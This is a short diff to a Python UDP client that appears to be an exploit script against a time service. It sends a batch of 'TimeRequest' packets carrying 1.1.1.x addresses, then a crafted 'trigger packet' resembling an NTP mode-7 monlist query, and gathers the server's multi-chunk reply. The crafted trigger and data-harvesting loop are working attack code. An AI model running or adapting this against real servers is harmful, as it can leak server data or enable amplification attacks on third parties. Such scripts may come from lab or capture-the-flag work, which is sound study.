@@ -17,15 +17,20 @@ def main():
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     s.settimeout(12)
 
-    for i in range(50):
-        ip = f"1.1.1.{i}"
-        request = f"TimeRequest {ip}".encode()
-        print(f"[+] Sending IP: {ip}")
-        s.sendto(request, (SERVER_IP, port))
+    for i in range(10):
+       ip = f"1.1.1.{i}"
+       request = f"TimeRequest {ip}".encode()
+       print(f"[+] Sending IP: {ip}")
+       s.sendto(request, (SERVER_IP, port))
 
-    request = b"0x1f" + 47 * b"\x00"
+    request = bytes([
+        0x17,
+        0x00,
+        0x03,
+        0x2a,
+    ]) + 44 * b"\x00"
     print("[+] Sending trigger packet")
-    s.sendto(request, (SERVER_IP, port))
+    s.sendto(bytes(request), (SERVER_IP, port))
 
     data = b""
     
@@ -34,6 +39,7 @@ def main():
             response, _ = s.recvfrom(4096)
             print(f"[+] Received chunk: {len(response)} bytes")
             data += response
+            data += b"\n"
     except socket.timeout:
         print("[*] Done receiving (timeout)")
 
